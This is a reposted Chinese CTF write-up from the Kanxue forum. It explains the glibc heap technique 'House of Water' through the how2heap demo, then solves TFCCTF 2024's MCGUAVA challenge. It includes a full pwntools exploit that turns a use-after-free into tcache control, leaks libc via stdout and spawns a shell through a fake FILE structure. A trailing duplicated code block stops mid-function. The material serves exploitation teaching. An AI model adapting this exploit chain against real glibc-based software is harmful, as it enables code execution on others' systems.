# House of water & TFCCTF 2024 MCGUAVA

> 原文: https://www.ctfiot.com/205266.html
> ID: 205266

一

House of water

早就听 Csome 学长说过有种打法叫 house of water，但是当时没去看，时间久了就忘记这个东西了，现在记起来了就来学习一下。由于笔者的水平有限，文章不免会出现许多错误，希望各位师傅能过包容以及指正。这篇文章的程序的测试环境为 ubuntu 22.04.3 TLS。

这个打法由国际战队 blue water 提出的，下面来看看该团队对这个打法的描述：

House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a t-cache
metadata control primitive, with the added benefit of obtaining a free libc pointer in the
t-cache metadata as well.

NOTE: This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will
contain 4 bits of randomness. If you can increment integers, no brutefore is required.

By setting the count of t-cache entries 0x3e0 and 0x3f0 to 1, a “fake” heap chunk header of
size “0x10001” is created.

This fake heap chunk header happens to be positioned above the 0x20 and 0x30 t-cache linked
address entries, enabling the creation of a fully functional fake unsorted-bin entry.

The correct size should be set for the chunk, and the next chunk’s prev-in-use bit
must be 0. Therefore, from the fake t-cache metadata chunk+0x10000, the appropriate values
should be written.

Finally, due to the behavior of allocations from unsorted-bins, once t-cache metadata control
is achieved, a libc pointer can also be inserted into the metadata. This allows the libc pointer
to be ready for allocation as well.

Technique / house by @udp_ctf – Water Paddler / Blue Water

相信大多数人都没看懂（感觉是我理解力有待提高），不过不用着急，接下来我会进行比较详细的讲解。

该打法的利用前置条件如下：

程序存在UAF漏洞
程序可以申请住够大的堆块

这里需要注意的是，完成该打法不需要泄露任何内存地址且不需要任何堆上的溢出。

最终的效果是能够在 tcache 的链表上留下 libc 的相关地址，并将其申请出来，效果如下：

当程序开始运行并遇到它的第一个 malloc 时，堆（main arena）将被初始化。默认情况下（libc 2.31+），将分配 0x290 的内存大小来存储 tcache_perthread_struct 结构体，该结构体存储各个不同 size 的 tcache 链表的 chunk 的个数以及最后进入链表的 chunk 的 data 区域地址。该结构体的源码如下：

/* There is one of these for each thread, which contains the
 per-thread cache (hence "tcache_perthread_struct"). Keeping
 overall size low is mildly important. Note that COUNTS and ENTRIES
 are redundant (we could have just counted the linked list each
 time), this is for performance reasons. */
typedef struct tcache_perthread_struct
{
 uint16_t counts[TCACHE_MAX_BINS];
 tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

我们最终的目的是在这个结构体中的 entries 区域留下 libc 的相关地址，进而让我们能够申请 libc 上的内存。

这里我们选用 how2heap 中的house of water（https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_water.c）这个例子来解释，这里我做了一些简单的修改，把一些英文段落进行了删除，只留下程序执行代码。

// Ubuntu 22.04.3 LTS
// gcc -g house_of_water.c -o test
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(void) {
 void *_ = NULL;

 setbuf(stdin, NULL);
 setbuf(stdout, NULL);
 setbuf(stderr, NULL);

 void *fake_size_lsb = malloc(0x3d8);
 void *fake_size_msb = malloc(0x3e8);
 free(fake_size_lsb);
 free(fake_size_msb);

 void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));

 void *x[7];
 for (int i = 0; i < 7; i++) {
 x[i] = malloc(0x88);
 }


 void *unsorted_start = malloc(0x88);
 _ = malloc(0x18); // Guard chunk

 void *unsorted_middle = malloc(0x88);
 _ = malloc(0x18); // Guard chunk

 void *unsorted_end = malloc(0x88);
 _ = malloc(0x18); // Guard chunk

 _ = malloc(0xf000); // Padding
 void *end_of_fake = malloc(0x18); // Metadata chunk

 *(long *)end_of_fake = 0x10000;
 *(long *)(end_of_fake+0x8) = 0x20;

 for (int i = 0; i < 7; i++) {
 free(x[i]);
 }

 *(long*)(unsorted_start-0x18) = 0x31;

 free(unsorted_start-0x10); // Create a fake FWD

 *(long*)(unsorted_start-0x8) = 0x91;

 *(long*)(unsorted_end-0x18) = 0x21;

 free(unsorted_end-0x10); // Create a fake BCK

 *(long*)(unsorted_end-0x8) = 0x91;

 free(unsorted_end);

 free(unsorted_middle);

 free(unsorted_start);

 *(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);

 *(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);

 // Next allocation *could* be our faked chunk!
 void *meta_chunk = malloc(0x288);

 assert(meta_chunk == (metadata+0x90));
}

因为在编译阶段我们使用了“-g”参数，可以使用gdb在任意行下断点 b + 行号。

接下来对这段 demo 进行调试。

将断点下到第 18 行，此时程序完成的操作如下：

申请了 2 个堆块，size 分别为 0x3e0 和 0x3f0，紧接着将其释放掉。

我们来看看此时的 tcache_perthread_struct 结构体：

可以看到第二个框框的地方的地址就是我们刚才释放的 2 个堆块地址，而第一个框框则是 size 为 0x3e0 和 0x3f0 对应的 tcache 链表 chunk 的个数，然而这个 heapbase+0x88 这个 0x10001 可以作为我们fake chunk 的size，如果我们将这个地方作为 fake chunk 并放入 unsorted bin（后面称这个 chunk 为 fake unsorted chunk），我们就能够在 tcache_perthread_struct 结构体上踩上 libc 的地址。

接下来将断点下到第 0x38 行，这期间做的都是堆块申请工作：

连续申请了 7 个 0x90 大小的 chunk，然后交替申请 0x90 和 0x20 大小的 chunk。我们最终希望最后申请的 3 个 0x90 大小的chunk 可以进入 unsorted bin，所以每 2 个 chunk 之间都申请一个小堆块来防止他们合并。这里将要进入 unsorted bin 的三个 chunk 分别命名为：unsorted_start、unsorted_middle、unsorted_end。很好理解吧，开始、中间、结束。

最后还申请了一个特别大的 chunk，size 为 0xf0010，后面紧接着一个 size 为 0x20 的小 chunk。

接着将断点下到第 41 行，这里在最后那个 size 为 0x20 的 chunk 的 fd 位置写上 0x1000，在 bk 位置写上 0x20。

这样做是为了绕过 unsorted bin的检测。我们回到最初的 fake unsorted chunk 的位置，其起始地址为0x555555559080。

我们需要让这个 chunk 在 unsorted bin 中合法，我们就需要在让这样 fake unsorted chunk 在结束的时候的下个 chunk 的 prev_size 为 0x10000，且 size 的 issue 位为 0（因为 unsorted bin 中的堆块都是已经释放过的未使用的）。

接下来就是对这个 fake unsorted chunk 进行装修。

将断点下在第 57 行，此时 bin 的结构如下：

期间做的操作就是将最开始申请的 7 个 0x90 大小的 chunk 给释放掉（将 size 为 0x90 大小的 tcache 链表给填满，确保后面三个 0x90 大小的堆块给释放后能够进入到 unsorted bin），然后在 unsorted_start 和 unsorted_end 上方分别伪造一个小堆块然后释放掉，这里主要讲解一下堆块的伪造。

对于 unsorted_start 上方堆块的伪造，我们直接在 unsorted_start-0x8 的地方填上 0x31 来当作 fake chunk 的 size 然后直接释放（这个 size 是有讲究的，后面会解释到），unstorted_end 的做法也类似，不过 fake chunk 的大小为 0x20。在将 fake chunk 给释放后由于堆块进入 tcache 链表后 fd+8 的地方会填上一个 key，这个 key 的作用是用来检测 tcache 上是否出现 double free，这个 key 的存在破坏了原先 unsorted_start 和 unsorted_end 这 2 个堆块的 size 位，所以我们要给予恢复，第 50 和 第 56 行的代码的作用就是如此。

那么伪造 2 个 fake chunk 然后 释放掉有什么意义呢？

我们回到前面，前面说过接下来的操作是为了对要进入 unsorted bin 的 fake unsorted chunk 进行装修，而 unsorted bin 是存在 fd 和 bk 指针的，此时再来看看我们的 fake unsorted chunk。

可以看到 fake chunk 的 fd 和 bk 已经留下我们前面 2 个释放的 fake chunk 的 data 区域地址，同时这个 2 地址。

也分别是 unsorted_end 和 unsorted_start 这 2 个堆块的地址，这是因为 0x555555559090 这个地址为 tcache_perthread_struct 结构体 entries 链表的起始地址，存放的是最后进入 0x20 大小的 tcache 链表的堆块的地址，而我们最后释放的 2 个 fake chunk 大小分别为 0x20 和 0x30。

我们将断点下到第 63 行，期间进行的操作为：依次释放 unsorted_end、unsorted_middle、unsorted_start。bin 的结构如下：

接下来我们的操作是要让我们一开始在 tcache_perthread_struct 中伪造的堆块链入 unsorted bin，这里的操作是将 unsorted_middle 给替换为 fake chunk。回到我们 fake chunk 的那张图片，我们可以看到 fake chunk 的fd 指针已经指向 unsorted_end，bk 指针已经指向 unsorted_start，所以接下来的操作就是令 unsorted_start 的 fd 指针指向 fake unsorted chunk，unsorted_end 的 bk 指针指向 fake unsorted chunk 即可完成 unsorted bin 上堆块替换操作。

将断点下在第 67 行，期间的操作就是进行上述的指针替换操作，最后的 bin 结构如下：

可以看到已经成功将 unsorted_middle 给替换为 fake chunk。

接下来就是要让 fake unsorted chunk 的 fd 指针和 bk 指针出现 libc 的地址，当我们申请一个 chunk 的size 小于 0x10000 且无对应 size 的 chunk 在tcache 和其他 bin 中时，会先对 unsroted bin 进行遍历，然后 unsorted_end 和 unsorted_start 送入 smallbin 中，将 fake chunk 送入 largebin 中，此时 fake chunk 的 fd 和 bk 指针指向 libc 的相关地址，此时再在 fake unsorted chunk 中切割出合适大小的堆块进行分配。how2heap 的代码中选择申请的堆块大小为 0x290，其实申请的大小满足我上面所说的条件即可。

将断点下到 70 行，此时已经完成了堆块的申请，查看 tcache_perthread_struct 结构体和 bin 的结构：

已经给踩上 libc 上的地址⬆️

此时我们可以进行 libc 上内存的分配，这也是 house of water 的所有内容，后续的攻击就看每个人的需求了。

可以看到 house of water 能够在没有内存泄露的情况下在 tcache 链上留下 libc 的相关地址。在修改 unsorted_start 和 unsroted_end 的指针使 fake unsorted chunk 链入unosorted chunk 的这步中我们需要进行一步小爆破，因为我们每次修改不能只覆盖地址的低3位，而是低4位，在开启了 alsr 的环境下从第 4 位开始的地址都是随机的。

我认为 house of water 攻击的关键是伪造并释放那 2 个大小分别为 0x20 和 0x30 的堆块，想了想这个伪造在 pwn 题中并不简单。

希望读者能够自己调试一遍 how2heap 里面的代码，相信你们一定会有新的收获。

二

TFCCTF 2024MCGUAVA

这道题目需要用到 house of water，当时好像有 7 解了，可是我还没做出来。

当时的想法是让同一个 chunk 同时进入 unsortedbin 和 smallbin 以此来留下 libc 的地址，可是搞了半天什么都没搞出来，不知道有没有师傅是用这种方法做出来的。

题目可以从 r3kapig 战队的比赛题库中找到：TFC CTF 2024(Jeopardy) (https://r3kapig-not1on.notion.site/TFC-CTF-2024-Jeopardy-bc81d99eb2064c8db48faf5bc5af50ee)

这题附件里给的 dockerfile 里写的远程环境为 ubuntu:24.10，我寻思着这不也才 8 月嘛，怎么都有 10 了。

这里我做了个小偷懒，libc 我用了本地的 2.35，不过大差不差，最终思路还是一样的，也就一个偏移不同而已。

由于题目代码量比较少，这里就直接贴上来。

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
 int v3; // [rsp+0h] [rbp-10h] BYREF
 int i; // [rsp+4h] [rbp-Ch]
 unsigned __int64 v5; // [rsp+8h] [rbp-8h]

 v5 = __readfsqword(0x28u);
 setvbuf(stdin, 0LL, 2, 0LL);
 setvbuf(_bss_start, 0LL, 2, 0LL);
 setvbuf(stderr, 0LL, 2, 0LL);
 for ( i = 0; i <= 255; ++i )
 guava_gius[i] = 0LL;
 banner();
 while ( 1 )
 {
 menu();
 __isoc99_scanf("%d", &v3);
 if ( v3 == 3 )
 exit(0);
 if ( v3 > 3 )
 {
LABEL_13:
 puts("invalid choice");
 }
 else if ( v3 == 1 )
 {
 guava();
 }
 else
 {
 if ( v3 != 2 )
 goto LABEL_13;
 gius();
 }
 }
}

unsigned __int64 guava()
{
 int v0; // eax
 int v2; // [rsp+8h] [rbp-18h] BYREF
 int v3; // [rsp+Ch] [rbp-14h] BYREF
 char *v4; // [rsp+10h] [rbp-10h]
 unsigned __int64 v5; // [rsp+18h] [rbp-8h]

 v5 = __readfsqword(0x28u);
 if ( cnt_guavas > 255 )
 {
 puts("guava overload");
 exit(0);
 }
 printf("how many guavas: ");
 __isoc99_scanf("%d", &v2);
 if ( v2 > 1791 )
 {
 puts("guava overload");
 exit(0);
 }
 v4 = (char *)malloc(v2);
 printf("guavset: ");
 __isoc99_scanf("%d", &v3);
 if ( v3 < 0 || v2 - 2 <= v3 )
 {
 puts("guava overload");
 exit(0);
 }
 printf("guavas: ");
 read(0, &v4[v3], v2 - v3);
 v0 = cnt_guavas++;
 guava_gius[v0] = v4;
 return v5 - __readfsqword(0x28u);
}

unsigned __int64 gius()
{
 unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v2; // [rsp+8h] [rbp-8h]

 v2 = __readfsqword(0x28u);
 printf("guava no: ");
 __isoc99_scanf("%d", &v1);
 if ( v1 >= 0x100 )
 {
 puts("guava overload");
 exit(0);
 }
 free((void *)guava_gius[v1]);
 return v2 - __readfsqword(0x28u);
}

这是一个很典型的菜单程序，实现了堆块的申请和释放功能，没有编辑和和打印功能。漏洞十分的明显，就是 gius 在释放堆块后并没有将相应的指针置 0，这里存在 UAF 漏洞。程序最多可以申请 0x100 个堆块，每个堆块最大为 0x1791，这不摆明着让我们使用 house of water 进行攻击嘛？

这里先贴上我的交互脚本：

def meau(index):
 p.recvuntil('*>',timeout = 1)
 p.sendline(str(index))

def add(size,index=0,content=b'a'):
 meau(1)
 p.recvuntil('how many guavas:')
 p.sendline(str(size))
 p.recvuntil('guavset:',timeout=1)
 p.sendline(str(index))
 p.recvuntil('guavas:')
 p.send(content)

def free(index):
 meau(2)
 p.recvuntil('guava no:')
 p.sendline(str(index))

现在我们的整理思路是利用 house of water 实现 stdout 上的内存分配，然后通过 stdout 泄露出 libc 的地址，最后通过伪造 io file 来 getshell。

既然上面说到 house of water 的关键是伪造 unsorted_start 和 unsroted_end 上方的2个小堆块，这里就先进行这一步，已经 unsorted_start 为例。

因为我们的小 fake chunk 和 unsorted_start 最终都是要给 free 掉的，所以我们要先获得他的索引，这里我使用的是堆块切割法，通过让一个巨大的堆块进入 unsorted bin，然后按照一定的大小申请 2 个堆块出来获取索引，然后再将申请出来的堆块释放掉，使其再次和合并进入 unsorted bin，相关代码如下：

add(0x600) # 7
add(0x600) # 8 fake 0x30
add(0x600) # 9
add(0x500) # 10
free(7)
free(8)
free(9)
add(0x610) # 11
add(0x500) # 12 unsorted_start
free(11)
free(12)
add(0x610,0x608,p64(0x31)) # 13
free(13)
free(8)
add(0x610) # 14
add(0x500) # 15 unsorted_start
add(0x6e0) # 16

这里我一共申请了 4 个大堆块，其中第 4 个堆块是用于防止 unsorted bin 与 top chunk 进行合并。可能有人会问为什么我要申请这么大的堆块来防止合并，其实我是为了减少对 tcache 的影响，因为 house of water 后的攻击将会在 tcache_perthread_struct 中进行，所以我尽可能的让更少的 chunk 进入 tcache。这里进行了 fake 0x30 和 unsorted_start 2 个堆块索引的获取，并将 fake 0x30 释放掉进入 tcache。

这里我们将上面代码进行修改如下：

add(0x600) # 7
add(0x600) # 8 fake 0x30
add(0x600) # 9
add(0x500) # 10
free(7)
free(8)
free(9)
add(0x610) # 11
add(0x500) # 12 unsorted_start
free(11)
free(12)
add(0x610,0x608,p64(0x31)) # 13
free(13)
free(8)
add(0x610) # 14
add(0x500) # 15 unsorted_start
add(0x6e0) # 16
free(15) # free unsorted_start

这里释放了我们 unsorted_start，此时 bin 的结构如下：

可以看到 0x30 的 tcache 和 unsorted bin 指向的是同一块区域，说明我们伪造成功。

对于 unsorted_end 上方 fake chunk 的伪造原理相同，只不过这里的 fake chunk 大小为 0x20，代码如下：

add(0x600) # 17
add(0x600) # 18 fake 0x20
add(0x600) # 19
add(0x500) # 20
free(17)
free(18)
free(19)
add(0x610) # 21
add(0x500) # 22 unsorted_end
free(21)
free(22)
add(0x610,0x608,p64(0x21)) # 23
free(23)
free(18)
add(0x610) # 24
add(0x500) # 25 unsorted_end
add(0x6e0) # 26

接下来需要获取 unsorted_middle 这个堆块的索引，因为这个堆块不需要在上方伪造 fake chunk，所以索引比较容易获得，直接申请即可：

add(0x500) # 27 unsorted_middle
add(0x600) # 28

第二个堆块同样是为了防止合并。

后面依然进行简单的操作，在 tcache_perthread_struct 上进行 fake unsorted chunk 的伪造，这部也比较简单，已经成为模板化的东西了，申请 2 个 size 分别为 0x3f0 和 0x3e0 的堆块然后直接释放掉即可。

add(0x3e8) # 29
add(0x3d8) # 30
free(29)
free(30)

效果如下：

这一步主要是因为程序没有编辑功能，当我们将 unsorted_end、unsorted_middle、unsorted_start 释放进 unsorted bin 时我们就无法修改 unsorted_start 和 unsorted_end 的指针。

这里我还是使用堆块切割是思想，相关代码如下：

# 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x30 和 unsorted_start
 free(14)
 free(15)
 add(0x300) # 31
 add(0x300-0x20) # 32
 add(0x330) # 33 change unsorted_start
 free(33)
 add(0x1e0) # 34

 # 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x20 和 unsorted_end
 free(24)
 free(25)
 add(0x300) # 35
 add(0x300-0x20) # 36
 add(0x340) # 37 change unsorted_end
 free(37)
 add(0x1d0) # 38

这里用于修改 unsorted_start 和 unsorted_end 的堆块我选择的大小为 0x340 和 0x350，因为这个 2 个大小的堆块个释放后是直接进入 tcache，对后面 unsorted bin 中存储的 unsorted_end、unsorted_middle、unsorted_start 影响比较小。

但由于这个操作改变了原来 unsorted_end、unsorted_start 的 size位。

所以我们需要用我们刚获取的 tcache 堆块来对 unsorted_end、unsorted_start 的 size 位进行恢复。

add(0x330,0x18,p64(0x511)) # 39
 free(39)
 add(0x340,0x18,p64(0x511)) # 40
 free(40)

因为我们的 fake unsorted chunk 最终进入到 unsorted bin 中，unsorted bin 会检测这个堆块的合法性，会检测 fake unosrted chunk 的 next chunk 的prev_size 和 size，伪造代码如下：

for i in range(36):
 add(0x500)

add(0x210) # 76
add(0x30,0x20,p64(0x10000)+p64(0x20)) # 77

注意这里 next chunk 的 issue 位要为 0，因为 unsorted bin 上的堆块都是没有给使用的。

接下来就是愉快的一条龙服务，依次释放 unsorted_end、unsorted_middle、unsorted_start 进入 unsorted bin，然后分别修改 unsorted_start 和 unsorted_end 的 fd 和 bk 指针将 fake unsorted chunk 链入 unsorted bin 中。

add(0x238) #78
add(0x248) #79
free(78)
free(79)
# 依次释放 unsorted_end、unsorted_middle、unsorted_start
free(25)
free(27)
free(15)

# 令 unsorted_start 的 fd 指针和 unsorted_end 的 bk 指针指向 fake unsorted chunk
add(0x330,0x20,p16(0x0080)) # 80
free(80)
add(0x340,0x28,p16(0x0080)) # 81
free(81)

这里我提前申请了 2 个 chunk，大小分别为 0x240 和 0x250，这 2 个堆块在后续的攻击中会用到。在修改 fd 和 bk指针中我们需要爆破地址的第 4 位，概率为 1/16，我这里选择爆破的是 heapbase 的第 4 位为 0，成功后的效果如下：

可以看到 fake unsorted chunk 已经进入到 unsorted bin 中，现在我们来梳理一下目前的状况：

目前 unsorted bin 中有 3 个堆块，两侧的 unsorted_end、unsorted_start 大小为 0x510，中间的 fake unsorted chunk 的大小为 0x10001，两侧的堆块十分的碍事，所以我们将其申请出来。

add(0x500)
add(0x500)

此时 fake unsorted chunk 已经进入到 largebin 中，并在 tcache 上踩下 libc 的地址。

现在我们的思路就非常的明确了，我的做法是先申请一个 0x110 大小的堆块。

add(0x100,0,p16(0x2780))

此时 largebin 的 fd 指针所在的位置正好是 tcache_perthread_struct 上 0x240 大小 tcache 最后一个 chunk 的存储地址，此时已经给踩上了 libc 的地址。

然后再将该地址申请出来，将地址的低 3 位改为 stdout 地址的低 3 位，爆破第 4 位，用 tcache 分配堆块到 stdout 上进而泄露出 libc 的地址，这里的爆破成功率也为 1/16。

add(0x100,0,p16(0x2780))
add(0x230,0,p64(0xfbad1800)+p64(0)*3+b'x00x00')
p.recvuntil(b'x7f',timeout=1)
libc_base = u64(p.recvuntil(b'x7f',timeout=1)[-6:].ljust(8,b'x00'))-0x219aa0

获取 libc 地址后我们可以吧刚才申请在 tcache_perthread_struct 上的堆块释放掉再重新申请回来，然后在 tcache_perthread_struct 上存储 0x250 大小 tcache 最后一个 chunk 的地方写上IO_2_1_stderr的地址，并申请 0x250 大小的堆块在IO_2_1_stderr上写上 fake file。

free(86)
add(0x100,0x8,p64(libc_base+libc.symbols['_IO_2_1_stderr_']))

fake_file = flat({
 0x0: b" sh;",
 0x28: libc_base + libc.symbols['system'],
 0x88: libc_base + libc.symbols['_environ']-0x10,
 0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40, # _wide_data
 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
}, filler=b"x00")

最后让程序通过 exit 函数退出即可执行我们的 fsop 攻击。

下面给出完整 exp，exp 写的比较乱且注释上对堆块的标号有点不太准确，请师傅们多多包容。

from pwn import *
from LibcSearcher import *
from ctypes import *
from struct import pack
import numpy as np
import base64
from bisect import *

context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['wt.exe', '-w', "0", "sp", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "bash", "-c"]
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
# ld = ELF('./ld-2.31.so')

def lg(buf):
 global heap_base
 global libc_base
 global target
 global temp
 global stack
 global leak
 log.success(f' 33[33m{buf}:{eval(buf):#x} 33[0m')

def meau(index):
 p.recvuntil('*>',timeout = 1)
 p.sendline(str(index))

def add(size,index=0,content=b'a'):
 meau(1)
 p.recvuntil('how many guavas:')
 p.sendline(str(size))
 p.recvuntil('guavset:',timeout=1)
 p.sendline(str(index))
 p.recvuntil('guavas:')
 p.send(content)

def free(index):
 meau(2)
 p.recvuntil('guava no:')
 p.sendline(str(index))

while True:
 p = process(["./ld-linux-x86-64.so.2", "./pwn"],
 env={"LD_PRELOAD":"./libc.so.6"})

 # 这两个循环为多余操作，当时脑抽写的，后面懒的删了
 for i in range(7):
 add(0x88)

 for i in range(7):
 free(i)

 # 获取 fake 0x30 和 unsorted_start 堆块的索引
 add(0x600) # 7
 add(0x600) # 8 fake 0x30
 add(0x600) # 9
 add(0x500) # 10
 free(7)
 free(8)
 free(9)
 add(0x610) # 11
 add(0x500) # 12 unsorted_start
 free(11)
 free(12)
 add(0x610,0x608,p64(0x31)) # 13
 free(13)
 free(8)
 add(0x610) # 14
 add(0x500) # 15 unsorted_start
 add(0x6e0) # 16

 # 获取 fake 0x20 和 unsorted_end 堆块的索引
 add(0x600) # 17
 add(0x600) # 18 fake 0x20
 add(0x600) # 19
 add(0x500) # 20
 free(17)
 free(18)
 free(19)
 add(0x610) # 21
 add(0x500) # 22 unsorted_end
 free(21)
 free(22)
 add(0x610,0x608,p64(0x21)) # 23
 free(23)
 free(18)
 add(0x610) # 24
 add(0x500) # 25 unsorted_end
 add(0x6e0) # 26

 # 获取 unsorted_middle 的索引
 add(0x500) # 27 unsorted_middle
 add(0x600) # 28

 # 伪造 fake unsorted chunk （size、fd、bk）
 add(0x3e8) # 29
 add(0x3d8) # 30
 free(29)
 free(30)

 # 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x30 和 unsorted_start
 free(14)
 free(15)
 add(0x300) # 31
 add(0x300-0x20) # 32
 add(0x330) # 33 change unsorted_start
 free(33)
 add(0x1e0) # 34

 # 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x20 和 unsorted_end
 free(24)
 free(25)
 add(0x300) # 35
 add(0x300-0x20) # 36
 add(0x340) # 37 change unsorted_end
 free(37)
 add(0x1d0) # 38

 add(0x330,0x18,p64(0x511)) # 39
 free(39)
 add(0x340,0x18,p64(0x511)) # 40
 free(40)

 # 在后面填充堆块，并伪造 prev_size 和 size 使 fake unsorted chunk 合法
 for i in range(36):
 add(0x500)

 add(0x210) # 76
 add(0x30,0x20,p64(0x10000)+p64(0x20)) # 77
 # 提前让 0x240、0x250 两个大小的堆块进入到 tcache，后面会用上
 add(0x238) #78
 add(0x248) #79
 free(78)
 free(79)
 # 依次释放 unsorted_end、unsorted_middle、unsorted_start
 free(25)
 free(27)
 free(15)

 # 令 unsorted_start 的 fd 指针和 unsorted_end 的 bk 指针指向 fake unsorted chunk
 add(0x330,0x20,p16(0x0080)) # 80
 free(80)
 add(0x340,0x28,p16(0x0080)) # 81
 free(81)
 try:
 add(0x500) # 82
 
except:
 p.close()
 continue

 # 将多余的 largebin 申请出来
 add(0x500) # 83

 # 修改
 add(0x100,0,p16(0x2780)) # 84
 add(0x100,0,p16(0x2780)) # 85
 try:
 add(0x230,0,p64(0xfbad1800)+p64(0)*3+b'x00x00') # 86
 
except:
 p.close()
 continue
 libc_base = 0
 try:
 p.recvuntil(b'x7f',timeout=1)
 libc_base = u64(p.recvuntil(b'x7f',timeout=1)[-6:].ljust(8,b'x00'))-0x219aa0
 if hex(libc_base)[2] != '7' or hex(libc_base)[3] != 'f':
 raise ValueError("leak libc error")
 
except:
 p.close()
 continue

 lg("libc_base")

 # 释放 tcache_perthread_struct 上的堆块，使我们能够再次编辑该结构体
 free(86)

 # 令 size 为 0x250 的 tcache 指向 _IO_2_1_stderr_
 add(0x100,0x8,p64(libc_base+libc.symbols['_IO_2_1_stderr_'])) # 87

 fake_file = flat({
 0x0: b" sh;",
 0x28: libc_base + libc.symbols['system'],
 0x88: libc_base + libc.symbols['_environ']-0x10,
 0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40, # _wide_data
 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
 }, filler=b"x00")

 # 在 _IO_2_1_stderr_ 上写上我们的 fake file
 add(0x240,0,fake_file)

 # 退出程序，执行 fsop 攻击
 meau(3)
 p.sendline(b'cat flag.txt')

 p.interactive()
 break

由于需要分别在 heapbase 和 stdout 上进行一次爆破，所以脚本执行的成功率为 1/256，运行后还要等半天。

打通，完结散花。

看雪ID：Qanux

https://bbs.kanxue.com/user-home-985117.htm

*本文为看雪论坛精华文章，由 Qanux 原创，转载请注明来自看雪社区

# 往期推荐

1、Alt-Tab Terminator注册算法逆向

2、恶意木马历险记

3、VMP源码分析：反调试与绕过方法

4、Chrome V8 issue 1486342浅析

5、Cython逆向-语言特性分析

球分享

球点赞

球在看

点击阅读原文查看更多


```
一
House of water
/* There is one of these for each thread, which contains the
 per-thread cache (hence "tcache_perthread_struct"). Keeping
 overall size low is mildly important. Note that COUNTS and ENTRIES
 are redundant (we could have just counted the linked list each
 time), this is for performance reasons. */
typedef struct tcache_perthread_struct
{
 uint16_t counts[TCACHE_MAX_BINS];
 tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
// Ubuntu 22.04.3 LTS
// gcc -g house_of_water.c -o test
    #include <stdio.h>
    #include <stdlib.h>
    #include <assert.h>

int main(void) {
 void *_ = NULL;

 setbuf(stdin, NULL);
 setbuf(stdout, NULL);
 setbuf(stderr, NULL);

 void *fake_size_lsb = malloc(0x3d8);
 void *fake_size_msb = malloc(0x3e8);
 free(fake_size_lsb);
 free(fake_size_msb);

 void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));

 void *x[7];
 for (int i = 0; i < 7; i++) {
 x[i] = malloc(0x88);
 }


 void *unsorted_start = malloc(0x88);
 _ = malloc(0x18); // Guard chunk

 void *unsorted_middle = malloc(0x88);
 _ = malloc(0x18); // Guard chunk

 void *unsorted_end = malloc(0x88);
 _ = malloc(0x18); // Guard chunk

 _ = malloc(0xf000); // Padding
 void *end_of_fake = malloc(0x18); // Metadata chunk

 *(long *)end_of_fake = 0x10000;
 *(long *)(end_of_fake+0x8) = 0x20;

 for (int i = 0; i < 7; i++) {
 free(x[i]);
 }

 *(long*)(unsorted_start-0x18) = 0x31;

 free(unsorted_start-0x10); // Create a fake FWD

 *(long*)(unsorted_start-0x8) = 0x91;

 *(long*)(unsorted_end-0x18) = 0x21;

 free(unsorted_end-0x10); // Create a fake BCK

 *(long*)(unsorted_end-0x8) = 0x91;

 free(unsorted_end);

 free(unsorted_middle);

 free(unsorted_start);

 *(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);

 *(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);

 // Next allocation *could* be our faked chunk!
 void *meta_chunk = malloc(0x288);

 assert(meta_chunk == (metadata+0x90));
}
二
TFCCTF 2024MCGUAVA
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
 int v3; // [rsp+0h] [rbp-10h] BYREF
 int i; // [rsp+4h] [rbp-Ch]
 unsigned __int64 v5; // [rsp+8h] [rbp-8h]

 v5 = __readfsqword(0x28u);
 setvbuf(stdin, 0LL, 2, 0LL);
 setvbuf(_bss_start, 0LL, 2, 0LL);
 setvbuf(stderr, 0LL, 2, 0LL);
 for ( i = 0; i <= 255; ++i )
 guava_gius[i] = 0LL;
 banner();
 while ( 1 )
 {
 menu();
 __isoc99_scanf("%d", &v3);
 if ( v3 == 3 )
 exit(0);
 if ( v3 > 3 )
 {
LABEL_13:
 puts("invalid choice");
 }
 else if ( v3 == 1 )
 {
 guava();
 }
 else
 {
 if ( v3 != 2 )
 goto LABEL_13;
 gius();
 }
 }
}
unsigned __int64 guava()
{
 int v0; // eax
 int v2; // [rsp+8h] [rbp-18h] BYREF
 int v3; // [rsp+Ch] [rbp-14h] BYREF
 char *v4; // [rsp+10h] [rbp-10h]
 unsigned __int64 v5; // [rsp+18h] [rbp-8h]

 v5 = __readfsqword(0x28u);
 if ( cnt_guavas > 255 )
 {
 puts("guava overload");
 exit(0);
 }
 printf("how many guavas: ");
 __isoc99_scanf("%d", &v2);
 if ( v2 > 1791 )
 {
 puts("guava overload");
 exit(0);
 }
 v4 = (char *)malloc(v2);
 printf("guavset: ");
 __isoc99_scanf("%d", &v3);
 if ( v3 < 0 || v2 - 2 <= v3 )
 {
 puts("guava overload");
 exit(0);
 }
 printf("guavas: ");
 read(0, &v4[v3], v2 - v3);
 v0 = cnt_guavas++;
 guava_gius[v0] = v4;
 return v5 - __readfsqword(0x28u);
}
unsigned __int64 gius()
{
 unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v2; // [rsp+8h] [rbp-8h]

 v2 = __readfsqword(0x28u);
 printf("guava no: ");
 __isoc99_scanf("%d", &v1);
 if ( v1 >= 0x100 )
 {
